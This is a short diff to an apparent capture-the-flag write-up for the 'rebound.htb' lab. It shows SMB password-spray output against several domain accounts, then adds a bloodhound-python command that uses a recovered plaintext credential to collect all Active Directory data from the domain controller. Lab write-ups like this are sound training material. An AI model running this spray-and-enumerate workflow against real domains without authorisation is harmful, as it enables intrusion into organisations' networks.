@@ -110,3 +110,8 @@ SMB         10.129.232.31   445    DC01             [-] rebound.htb\winrm_svc:1G
 SMB         10.129.232.31   445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE 
 SMB         10.129.232.31   445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
 ```
+since we have vaild domain username and password  
+use bloodhound python to obtain the data of active directory
+```console
+$ bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -d rebound.htb -dc DC01.rebound.htb -c All -ns 10.129.232.31
+```
